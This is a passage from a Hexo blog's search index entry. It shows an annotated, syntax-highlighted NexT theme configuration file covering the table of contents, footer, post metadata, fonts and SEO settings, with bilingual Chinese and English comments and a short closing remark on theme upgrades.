class="comment"># 友链链接</span></span><br><span class="line"><span class="attr">links:</span></span><br><span class="line">  <span class="comment">#Title: https://example.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 侧边栏目录</span></span><br><span class="line"><span class="comment"># Table of Contents in the Sidebar</span></span><br><span class="line"><span class="comment"># Front-matter variable (nonsupport wrap expand_all).</span></span><br><span class="line"><span class="attr">toc:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Automatically add list number to toc.</span></span><br><span class="line">  <span class="comment"># 是否自动添加编号，建议写Markdown的时候就添加编号，然后这里关掉</span></span><br><span class="line">  <span class="attr">number:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># If true, all words will placed on next lines if header width longer then sidebar width.</span></span><br><span class="line">  <span class="comment"># 当标题宽度大于侧边栏宽度时，是否将标题放在下一行</span></span><br><span class="line">  <span class="attr">wrap:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># If true, all level of TOC in a post will be displayed, rather than the activated part of it.</span></span><br><span class="line">  <span class="comment"># 是否显示所有级别的目录</span></span><br><span class="line">  <span class="attr">expand_all:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Maximum heading depth of generated toc.</span></span><br><span class="line">  <span class="comment"># 目录深度</span></span><br><span class="line">  <span class="attr">max_depth:</span> <span class="number">6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 页脚设置</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Footer Settings</span></span><br><span class="line"><span class="comment"># See: https://theme-next.js.org/docs/theme-settings/footer</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 是否在页脚中显示多语言切换器</span></span><br><span class="line"><span class="comment"># Show multilingual switcher in footer.</span></span><br><span class="line"><span class="attr">language_switcher:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="attr">footer:</span></span><br><span class="line">  <span class="comment"># Specify the year when the site was setup. If not defined, current year will be used.</span></span><br><span class="line">  <span class="comment"># 设置站点的年份，若未设置，则使用当前年份</span></span><br><span class="line">  <span class="comment">#since: 2021</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Icon between year and copyright info.</span></span><br><span class="line">  <span class="attr">icon:</span></span><br><span class="line">    <span class="comment"># Icon name in Font Awesome. See: https://fontawesome.com/icons</span></span><br><span class="line">    <span class="comment"># 页脚小图标</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">fa</span> <span class="string">fa-heart</span>  </span><br><span class="line">    <span class="comment"># If you want to animate the icon, set it to true.</span></span><br><span class="line">    <span class="comment"># 是否设置图标动画</span></span><br><span class="line">    <span class="attr">animated:</span> <span class="literal">false</span></span><br><span class="line">    <span class="comment"># Change the color of icon, using Hex Code.</span></span><br><span class="line">    <span class="comment"># 图标颜色</span></span><br><span class="line">    <span class="attr">color:</span> <span class="string">&quot;#ff0000&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># If not defined, `author` from Hexo `_config.yml` will be used.</span></span><br><span class="line">  <span class="attr">copyright:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 是否显示页脚的强力驱动</span></span><br><span class="line">  <span class="comment"># Powered by Hexo &amp; NexT</span></span><br><span class="line">  <span class="attr">powered:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 是否显示ICP等信息</span></span><br><span class="line">  <span class="comment"># Beian ICP and gongan information for Chinese users. See: https://beian.miit.gov.cn, http://www.beian.gov.cn</span></span><br><span class="line">  <span class="attr">beian:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">icp:</span></span><br><span class="line">    <span class="comment"># The digit in the num of gongan beian.</span></span><br><span class="line">    <span class="attr">gongan_id:</span></span><br><span class="line">    <span class="comment"># The full num of gongan beian.</span></span><br><span class="line">    <span class="attr">gongan_num:</span></span><br><span class="line">    <span class="comment"># The icon for gongan beian. See: http://www.beian.gov.cn/portal/download</span></span><br><span class="line">    <span class="attr">gongan_icon_url:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Post Settings</span></span><br><span class="line"><span class="comment"># See: https://theme-next.js.org/docs/theme-settings/posts</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 是否自动将主页中的描述摘录为前言文本，建议开启</span></span><br><span class="line"><span class="comment"># Automatically excerpt description in homepage as preamble text.</span></span><br><span class="line"><span class="attr">excerpt_description:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Read more button</span></span><br><span class="line"><span class="comment"># If true, the read more button will be displayed in excerpt section.</span></span><br><span class="line"><span class="comment"># 是否显示阅读更多按钮，建议开启</span></span><br><span class="line"><span class="attr">read_more_btn:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Post meta display settings</span></span><br><span class="line"><span class="attr">post_meta:</span></span><br><span class="line">  <span class="attr">item_text:</span> <span class="literal">true</span>        <span class="comment"># 显示帖子的描述文本。</span></span><br><span class="line">  <span class="attr">created_at:</span> <span class="literal">true</span>       <span class="comment"># 显示帖子的创建时间</span></span><br><span class="line">  <span class="attr">updated_at:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span>          <span class="comment"># 显示帖子的更新时间</span></span><br><span class="line">    <span class="attr">another_day:</span> <span class="literal">true</span>     </span><br><span class="line">  <span class="attr">categories:</span> <span class="literal">true</span>       <span class="comment"># 是否显示帖子类别</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 帖子字数以及阅读时间显示，需要安装hexo-word-counter 插件，并在站点配置文件中启用</span></span><br><span class="line"><span class="comment"># Post wordcount display settings</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/next-theme/hexo-word-counter</span></span><br><span class="line"><span class="attr">symbols_count_time:</span></span><br><span class="line">  <span class="attr">separated_meta:</span> <span class="literal">true</span>     <span class="comment"># 是否在单独的行显示字数和阅读时间</span></span><br><span class="line">  <span class="attr">item_text_total:</span> <span class="literal">false</span>   <span class="comment"># 是否在页脚显示字数和预计阅读时间</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 更改文章底部tag图标</span></span><br><span class="line"><span class="comment"># Use icon instead of the symbol # to indicate the tag at the bottom of the post</span></span><br><span class="line"><span class="attr">tag_icon:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 捐献设置，我的博客是技术分享，不设置捐献，所以我也没多研究</span></span><br><span class="line"><span class="comment"># Donate (Sponsor) settings</span></span><br><span class="line"><span class="comment"># Front-matter variable (nonsupport animation).</span></span><br><span class="line"><span class="attr">reward_settings:</span></span><br><span class="line">  <span class="comment"># If true, a donate button will be displayed in every article by default.</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">animation:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment">#comment: Buy me a coffee</span></span><br><span class="line"></span><br><span class="line"><span class="attr">reward:</span></span><br><span class="line">  <span class="comment">#wechatpay: /images/wechatpay.png</span></span><br><span class="line">  <span class="comment">#alipay: /images/alipay.png</span></span><br><span class="line">  <span class="comment">#paypal: /images/paypal.png</span></span><br><span class="line">  <span class="comment">#bitcoin: /images/bitcoin.png</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Subscribe through Telegram Channel, Twitter, etc.</span></span><br><span class="line"><span class="comment"># Usage: `Key: permalink || icon` (Font Awesome)</span></span><br><span class="line"><span class="attr">follow_me:</span></span><br><span class="line">  <span class="comment">#Twitter: https://twitter.com/username || fab fa-twitter</span></span><br><span class="line">  <span class="comment">#Telegram: https://t.me/channel_name || fab fa-telegram</span></span><br><span class="line">  <span class="comment">#WeChat: /images/wechat_channel.jpg || fab fa-weixin</span></span><br><span class="line">  <span class="comment">#RSS: /atom.xml || fa fa-rss</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 相关热门帖子，需要安装hexo-related-posts插件，然后在post页面中增加代码</span></span><br><span class="line"><span class="comment"># Related popular posts</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/sergeyzwezdin/hexo-related-posts</span></span><br><span class="line"><span class="attr">related_posts:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">title:</span> <span class="comment"># Custom header, leave empty to use the default one  # 默认使用相关帖子作为标题</span></span><br><span class="line">  <span class="attr">display_in_home:</span> <span class="literal">false</span>  <span class="comment"># 是否在首页显示相关帖子</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 帖子编辑功能，建议关闭，该功能可以让用户在 GitHub 上快速浏览和修改博客的源代码。</span></span><br><span class="line"><span class="comment"># Post edit</span></span><br><span class="line"><span class="comment"># Easily browse and edit blog source code online.</span></span><br><span class="line"><span class="attr">post_edit:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name/</span> <span class="comment"># Link for view source</span></span><br><span class="line">  <span class="comment">#url: https://github.com/user-name/repo-name/edit/branch-name/subdirectory-name/ # Link for fork &amp; edit</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发布导航功能，在帖子页脚中显示上一篇或者下一篇</span></span><br><span class="line"><span class="comment"># Show previous post and next post in post footer if exists</span></span><br><span class="line"><span class="comment"># Available values: left | right | false</span></span><br><span class="line"><span class="attr">post_navigation:</span> <span class="string">left</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置自定义页面</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Custom Page Settings</span></span><br><span class="line"><span class="comment"># See: https://theme-next.js.org/docs/theme-settings/custom-pages</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 标签设置页面</span></span><br><span class="line"><span class="comment"># TagCloud settings for tags page.</span></span><br><span class="line"><span class="attr">tagcloud:</span></span><br><span class="line">  <span class="attr">min:</span> <span class="number">12</span> <span class="comment"># Minimum font size in px</span></span><br><span class="line">  <span class="attr">max:</span> <span class="number">30</span> <span class="comment"># Maximum font size in px</span></span><br><span class="line">  <span class="attr">amount:</span> <span class="number">200</span> <span class="comment"># Total amount of tags</span></span><br><span class="line">  <span class="attr">orderby:</span> <span class="string">name</span> <span class="comment"># Order of tags</span></span><br><span class="line">  <span class="attr">order:</span> <span class="number">1</span> <span class="comment"># Sort order</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 谷歌日历页面</span></span><br><span class="line"><span class="comment"># Google Calendar</span></span><br><span class="line"><span class="comment"># Share your recent schedule to others via calendar page.</span></span><br><span class="line"><span class="attr">calendar:</span></span><br><span class="line">  <span class="attr">calendar_id:</span> <span class="string">&lt;required&gt;</span> <span class="comment"># Your Google account E-Mail</span></span><br><span class="line">  <span class="attr">api_key:</span> <span class="string">&lt;required&gt;</span></span><br><span class="line">  <span class="attr">orderBy:</span> <span class="string">startTime</span></span><br><span class="line">  <span class="attr">showLocation:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">offsetMax:</span> <span class="number">72</span> <span class="comment"># Time Range</span></span><br><span class="line">  <span class="attr">offsetMin:</span> <span class="number">4</span> <span class="comment"># Time Range</span></span><br><span class="line">  <span class="attr">showDeleted:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">singleEvents:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">maxResults:</span> <span class="number">250</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Misc Theme Settings</span></span><br><span class="line"><span class="comment"># See: https://theme-next.js.org/docs/theme-settings/miscellaneous</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># NexT 支持添加预连接资源提示以建立与字体和插件来源的早期连接。</span></span><br><span class="line"><span class="comment"># Preconnect CDN for fonts and plugins.</span></span><br><span class="line"><span class="comment"># For more information: https://www.w3.org/TR/resource-hints/#preconnect</span></span><br><span class="line"><span class="attr">preconnect:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文本对齐</span></span><br><span class="line"><span class="comment"># Set the text alignment in posts / pages.</span></span><br><span class="line"><span class="attr">text_align:</span></span><br><span class="line">  <span class="comment"># Available values: start | end | left | right | center | justify | justify-all | match-parent</span></span><br><span class="line">  <span class="attr">desktop:</span> <span class="string">justify</span></span><br><span class="line">  <span class="attr">mobile:</span> <span class="string">justify</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 移动设备适配</span></span><br><span class="line"><span class="comment"># Reduce padding / margin indents on devices with narrow width.</span></span><br><span class="line"><span class="attr">mobile_layout_economy:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主题颜色</span></span><br><span class="line"><span class="comment"># Browser header panel color.</span></span><br><span class="line"><span class="attr">theme_color:</span></span><br><span class="line">  <span class="attr">light:</span> <span class="string">&quot;#222&quot;</span></span><br><span class="line">  <span class="attr">dark:</span> <span class="string">&quot;#222&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 正文滚动条，覆盖浏览器的默认行为</span></span><br><span class="line"><span class="comment"># Override browsers&#x27; default behavior.</span></span><br><span class="line"><span class="attr">body_scrollbar:</span></span><br><span class="line">  <span class="comment"># Place the scrollbar over the content.</span></span><br><span class="line">  <span class="comment"># 将滚动条放在内容上</span></span><br><span class="line">  <span class="attr">overlay:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Present the scrollbar even if the content is not overflowing.</span></span><br><span class="line">  <span class="comment"># 显示滚动条，即使内容没有溢出</span></span><br><span class="line">  <span class="attr">stable:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 代码块相关功能</span></span><br><span class="line"><span class="attr">codeblock:</span></span><br><span class="line">  <span class="comment"># Code Highlight theme</span></span><br><span class="line">  <span class="comment"># All available themes: https://theme-next.js.org/highlight/</span></span><br><span class="line">  <span class="attr">theme:</span></span><br><span class="line">    <span class="attr">light:</span> <span class="string">default</span></span><br><span class="line">    <span class="attr">dark:</span> <span class="string">stackoverflow-dark</span></span><br><span class="line">  <span class="attr">prism:</span></span><br><span class="line">    <span class="attr">light:</span> <span class="string">prism</span></span><br><span class="line">    <span class="attr">dark:</span> <span class="string">prism-dark</span></span><br><span class="line">  <span class="comment"># Add copy button on codeblock</span></span><br><span class="line">  <span class="comment"># 添加复制按钮</span></span><br><span class="line">  <span class="attr">copy_button:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">    <span class="comment"># Available values: default | flat | mac</span></span><br><span class="line">    <span class="attr">style:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回顶部</span></span><br><span class="line"><span class="attr">back2top:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Back to top in sidebar.</span></span><br><span class="line">  <span class="comment"># 在侧边栏中返回顶部</span></span><br><span class="line">  <span class="attr">sidebar:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Scroll percent label in b2t button.</span></span><br><span class="line">  <span class="comment"># 显示滚动百分比</span></span><br><span class="line">  <span class="attr">scrollpercent:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示阅读进度</span></span><br><span class="line"><span class="comment"># Reading progress bar</span></span><br><span class="line"><span class="attr">reading_progress:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Available values: left | right</span></span><br><span class="line">  <span class="attr">start_at:</span> <span class="string">left</span></span><br><span class="line">  <span class="comment"># Available values: top | bottom</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">top</span></span><br><span class="line">  <span class="attr">reversed:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">color:</span> <span class="string">&quot;#37c6c0&quot;</span></span><br><span class="line">  <span class="attr">height:</span> <span class="string">3px</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存阅读进度（书签）</span></span><br><span class="line"><span class="comment"># Bookmark Support</span></span><br><span class="line"><span class="attr">bookmark:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Customize the color of the bookmark.</span></span><br><span class="line">  <span class="attr">color:</span> <span class="string">&quot;#222&quot;</span></span><br><span class="line">  <span class="comment"># If auto, save the reading progress when closing the page or clicking the bookmark-icon.</span></span><br><span class="line">  <span class="comment"># If manual, only save it by clicking the bookmark-icon.</span></span><br><span class="line">  <span class="attr">save:</span> <span class="string">auto</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># GitHub 横幅</span></span><br><span class="line"><span class="comment"># `Follow me on GitHub` banner in the top-right corner.</span></span><br><span class="line"><span class="attr">github_banner:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">permalink:</span> <span class="string">https://github.com/yourname</span></span><br><span class="line">  <span class="attr">title:</span> <span class="string">Follow</span> <span class="string">me</span> <span class="string">on</span> <span class="string">GitHub</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Font Settings</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Find fonts on Google Fonts (https://fonts.google.com)</span></span><br><span class="line"><span class="comment"># All fonts set here will have the following styles:</span></span><br><span class="line"><span class="comment">#   light | light italic | normal | normal italic | bold | bold italic</span></span><br><span class="line"><span class="comment"># Be aware that setting too much fonts will cause site running slowly</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Web Safe fonts are recommended for `global` (and `title`):</span></span><br><span class="line"><span class="comment"># Arial | Tahoma | Helvetica | Times New Roman | Courier New | Verdana | Georgia | Palatino | Garamond | Comic Sans MS | Trebuchet MS</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义字体，分为全局字体、网站标题字体、文章标题字体、文章字体和代码字体，说实话，没啥必要去自定义字体</span></span><br><span class="line"><span class="attr">font:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Uri of fonts host, e.g. https://fonts.googleapis.com (Default).</span></span><br><span class="line">  <span class="attr">host:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Font options:</span></span><br><span class="line">  <span class="comment"># `external: true` will load this font family from `host` above.</span></span><br><span class="line">  <span class="comment"># `family: Times New Roman`. Without any quotes.</span></span><br><span class="line">  <span class="comment"># `size: x.x`. Use `em` as unit. Default: 1 (16px)</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Global font settings used for all elements inside &lt;body&gt;.</span></span><br><span class="line">  <span class="attr">global:</span></span><br><span class="line">    <span class="attr">external:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">family:</span> <span class="string">Lato</span></span><br><span class="line">    <span class="attr">size:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Font settings for site title (.site-title).</span></span><br><span class="line">  <span class="attr">title:</span></span><br><span class="line">    <span class="attr">external:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">family:</span></span><br><span class="line">    <span class="attr">size:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Font settings for headlines (&lt;h1&gt; to &lt;h6&gt;).</span></span><br><span class="line">  <span class="attr">headings:</span></span><br><span class="line">    <span class="attr">external:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">family:</span></span><br><span class="line">    <span class="attr">size:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Font settings for posts (.post-body).</span></span><br><span class="line">  <span class="attr">posts:</span></span><br><span class="line">    <span class="attr">external:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">family:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Font settings for &lt;code&gt; and code blocks.</span></span><br><span class="line">  <span class="attr">codes:</span></span><br><span class="line">    <span class="attr">external:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">family:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索引擎优化</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># SEO Settings</span></span><br><span class="line"><span class="comment"># See: https://theme-next.js.org/docs/theme-settings/seo</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If true, site-subtitle will be added to index page.</span></span><br><span class="line"><span class="comment"># Remember to set up your site-subtitle in Hexo `_config.yml` (e.g. subtitle: Subtitle)</span></span><br><span class="line"><span class="attr">index_with_subtitle:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Automatically add external URL with Base64 encrypt &amp; decrypt.</span></span><br><span class="line"><span class="attr">exturl:</span> <span class="literal">false</span></span><br><span class="line"><span class="comment"># If true, an icon will be attached to each external URL</span></span><br><span class="line"><span class="attr">exturl_icon:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置谷歌站长工具的验证字符串用于提交站点地图。</span></span><br><span class="line"><span class="comment"># Google Webmaster tools verification.</span></span><br><span class="line"><span class="comment"># See: https://developers.google.com/search</span></span><br><span class="line"><span class="attr">google_site_verification:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置必应站长工具的验证字符串用于提交站点地图。</span></span><br><span class="line"><span class="comment"># Bing Webmaster tools verification.</span></span><br><span class="line"><span class="comment"># See: https://www.bing.com/webmasters</span></span><br><span class="line"><span class="attr">bing_site_verification:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Yandex Webmaster tools verification.</span></span><br><span class="line"><span class="comment"># See: https://webmaster.yandex.ru</span></span><br><span class="line"><span class="attr">yandex_site_verification:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Baidu Webmaster tools verification.</span></span><br><span class="line"><span class="comment"># See: https://ziyuan.baidu.com/site</span></span><br><span class="line"><span class="attr">baidu_site_verification:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第三方插件和服务设置，在这里不讲，后面优化博客的时候如果用到会说，第三方插件并不是所有都会用到</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Third Party Plugins &amp; Services Settings</span></span><br><span class="line"><span class="comment"># See: https://theme-next.js.org/docs/third-party-services/</span></span><br><span class="line"><span class="comment"># More plugins: https://github.com/next-theme/awesome-next</span></span><br><span class="line"><span class="comment"># You may need to install the corresponding dependency packages</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br></pre></td></tr></table></figure>

<p>next主题配置文件的配置项很多，但是其实大部分我们是不需要改动的。而且为了以后升级主题，不建议直接在主题配置文件中改动配置，而是使用备用主题配置来配置主题，至于怎么使用会在后续的博客中说。</p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>next</tag>
      </tags>
  </entry>
</search>
